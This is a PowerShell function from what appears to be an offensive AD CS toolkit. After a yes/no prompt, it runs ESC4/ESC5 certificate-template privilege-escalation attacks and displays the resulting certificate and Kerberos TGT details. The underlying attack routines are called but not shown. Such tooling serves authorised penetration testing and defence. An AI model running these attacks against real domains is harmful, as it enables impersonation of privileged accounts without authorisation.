function Invoke-InteractiveAttack {
    <#
        .SYNOPSIS
        Provides interactive attack execution for ESC vulnerabilities with current user confirmation.

        .DESCRIPTION
        This helper function consolidates the common attack execution logic for ESC4e1, ESC4p5, 
        and ESC5p5 attacks. It handles user prompting, attack invocation, result processing, 
        and formatted output display.

        .PARAMETER AttackType
        The type of attack being executed (ESC4e1, ESC4p5, or ESC5p5).

        .PARAMETER AttackResult
        The vulnerability result object to pass to the attack function.

        .PARAMETER Principal
        The principal being analyzed. If null, indicates current user analysis.

        .EXAMPLE
        Invoke-InteractiveAttack -AttackType "ESC4e1" -AttackResult $esc4e1Results[0] -Principal $null

        .EXAMPLE  
        Invoke-InteractiveAttack -AttackType "ESC4p5" -AttackResult $esc4p5ComboResults[0] -Principal $null
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateSet("ESC4e1", "ESC4p5", "ESC5p5")]
        [string]$AttackType,

        [Parameter(Mandatory = $true)]
        [object]$AttackResult,

        [Parameter(Mandatory = $false)]
        [object]$Principal
    )

    Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."

    # Only offer attack execution for current user analysis
    if ($Principal) {
        Write-Verbose "Principal specified - skipping interactive attack for non-current user analysis"
        return
    }

    Write-Host ""
    Write-Host "=== Attack Execution ===" -ForegroundColor Red
    Write-Host ""
    Write-Host "This $AttackType vulnerability can be exploited immediately since you have the required permissions." -ForegroundColor Yellow
    Write-Host ""
    $executeChoice = Read-Host "Do you want to execute the $AttackType attack now? (y/N)"
    
    if ($executeChoice -notmatch '^y|yes$') {
        Write-Host ""
        Write-Host "[*] Attack execution cancelled by user." -ForegroundColor Yellow
        return
    }

    Write-Host ""
    
    try {
        # Execute the appropriate attack function based on attack type
        $result = switch ($AttackType) {
            "ESC4e1" { 
                Invoke-ESC4e1Attack -ESC4e1Result $AttackResult 
            }
            "ESC4p5" { 
                Invoke-ESC4p5Attack -ESC4p5Result $AttackResult 
            }
            "ESC5p5" { 
                Invoke-ESC5p5Attack -ESC5p5Result $AttackResult 
            }
        }
        
        # Attack functions return one object or an array (one per template/CA). Normalize.
        $results = @($result)
        $succeeded = @($results | Where-Object { $_ -and ($_.Success -or $_.AttackSuccess) })

        if ($succeeded.Count -gt 0) {
            Write-Host "[+] $AttackType attack completed successfully!" -ForegroundColor Green

            foreach ($r in $succeeded) {
                # For the ESC4 chains the ESC1 result (with the TGT details) is nested
                # under .AttackResult; a direct attack carries the fields itself.
                $tgt = if ($r.AttackResult) { $r.AttackResult } else { $r }

                # Duplicate the ESC1/EOBO result-object display.
                [PSCustomObject]@{
                    Success         = [bool]($r.AttackSuccess -or $r.Success)
                    TemplateName    = $r.TemplateName
                    TargetPrincipal = $tgt.TargetPrincipal
                    TargetSID       = $tgt.TargetSID
                    SanPresent      = $tgt.SanPresent
                    Certificate     = $tgt.Certificate
                    PkinitVerified  = $tgt.PkinitVerified
                    Principal       = $tgt.Principal
                    Realm           = $tgt.Realm
                    TgtEndTime      = $tgt.TgtEndTime
                    Error           = $tgt.Error
                }
            }
        } else {
            Write-Host "[-] $AttackType attack did not succeed." -ForegroundColor Red
            foreach ($r in $results) {
                $err = if ($r.Error) { $r.Error } elseif ($r.ErrorMessage) { $r.ErrorMessage } else { $null }
                if ($err) { Write-Host "Error: $err" -ForegroundColor Red }
            }
        }
    } catch {
        Write-Host "[-] $AttackType attack failed with exception: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
}